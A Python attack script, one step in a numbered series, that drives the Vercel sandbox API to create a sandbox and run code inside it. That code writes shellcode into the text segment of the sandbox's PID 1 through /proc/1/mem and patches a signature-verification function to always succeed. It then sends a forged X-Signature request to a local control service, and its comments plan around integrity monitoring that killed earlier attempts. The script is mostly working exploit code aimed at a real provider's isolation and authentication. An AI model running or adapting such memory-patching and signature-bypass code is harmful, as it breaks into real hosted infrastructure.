# 实验J201: 决定性定位实验 - patch verify为call shellcode(写标记+返nil)
# j196/197: patch成31c0c36690仍被杀, 无法区分死因(I-cache / 完整性监控 / 头名错)
# j200: 公钥不在内存(掩码/懒加载), 换公钥需先解决; 头名已确认X-Signature/X-Timestamp
# 本步: 1)找text空区放shellcode(mov [mark],1; xor eax,eax; ret)
#       2)patch verify开头为 call shellcode (e8 rel32)
#       3)发CPV请求后读标记 -> 三态判定
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def bashfile(sid, cmd, label, n=26000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "bash", "args": ["-c", cmd], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj201"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME})
print("create:", c, flush=True)
if c != 200:
    print(r[:400], flush=True)
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid, flush=True)

CODE = r'''
import os, time, socket, struct
out = open("/tmp/d201.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
p("start")

fd = os.open("/proc/1/mem", os.O_RDWR)
def read_at(addr, n):
    os.lseek(fd, addr, 0)
    return os.read(fd, n)
def write_at(addr, b):
    os.lseek(fd, addr, 0)
    return os.write(fd, b)

# PA: 找text空区 (128字节连续0x00)
p("CP", "PA")
hole = None
os.lseek(fd, 0x400000, 0)
buf = os.read(fd, 0x8db000 - 0x400000)
i = buf.find(b"\x00" * 128)
if i < 0:
    i = buf.find(b"\xcc" * 128)
p("HOLE", hex(0x400000 + i) if i >= 0 else "none")
if i < 0:
    p("FATAL no hole")
    out.close(); os.close(fd); raise SystemExit
SC = 0x400000 + i  # shellcode地址
p("SC_ADDR", hex(SC))

# 标记地址: bss安全区 (rw-p从0xe9e000起)
MARK = 0x2ee1000
orig_mark = read_at(MARK, 4)
p("MARK_ORIG", MARK, orig_mark.hex())

# 构建shellcode: c7 05 disp32 01000000 | 31 c0 | c3
disp = MARK - (SC + 7)
sc = bytes([0xc7, 0x05]) + struct.pack("<i", disp) + bytes([0x01, 0x00, 0x00, 0x00, 0x31, 0xc0, 0xc3])
p("SC_LEN", len(sc), sc.hex())

# PB: 写shellcode + patch verify
p("CP", "PB")
write_at(SC, sc)
back = read_at(SC, len(sc))
p("SC_WRITE", back.hex() == sc.hex(), back.hex())
VERIFY = 0x83b3a0
orig_v = read_at(VERIFY, 5)
rel = SC - (VERIFY + 5)
patch = bytes([0xe8]) + struct.pack("<i", rel)
write_at(VERIFY, patch)
back = read_at(VERIFY, 5)
p("PATCH", orig_v.hex(), "->", back.hex(), "OK" if back == patch else "FAIL")
out.flush()

# PC: 发CPV请求 (X-Signature/X-Timestamp)
p("CP", "PC")
def http(port, method, path, headers, body=b"", to=5):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(to)
        s.connect(("127.0.0.1", port))
        hdrs = f"{method} {path} HTTP/1.1\r\nHost: 127.0.0.1\r\n"
        for k, v in headers.items():
            hdrs += f"{k}: {v}\r\n"
        hdrs += f"Content-Length: {len(body)}\r\n\r\n"
        s.send(hdrs.encode() + body)
        d = b""
        try:
            while True:
                b = s.recv(4096)
                if not b:
                    break
                d += b
                if len(d) > 4000:
                    break
        except Exception:
            pass
        s.close()
        return d
    except Exception as ex:
        return ("EXC:" + repr(ex)).encode()
now = str(int(time.time()))
d = http(30001, "POST", "/foo",
         {"Content-Type": "application/connect+json", "Connect-Protocol-Version": "1",
          "X-Signature": "AAAA", "X-Timestamp": now}, b"{}")
p("REQ1_RESP", d[:400]); out.flush()
time.sleep(1)

# PD: 读标记 -> 三态判定
p("CP", "PD")
m = read_at(MARK, 4)
p("MARK_NOW", m.hex())
# 也确认patch仍生效
back = read_at(VERIFY, 5)
p("PATCH_NOW", back.hex())
p("done")
out.close()
os.close(fd)
'''

st = run_cmd(sid, CODE, "J201", timeout=290)
time.sleep(2)
bashfile(sid, "cat /tmp/d201.txt", "marker", 12000)
if st == "DEAD":
    print("\n!!! DEATH -> 看marker: MARK_NOW=1则代码完整性监控实锤", flush=True)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
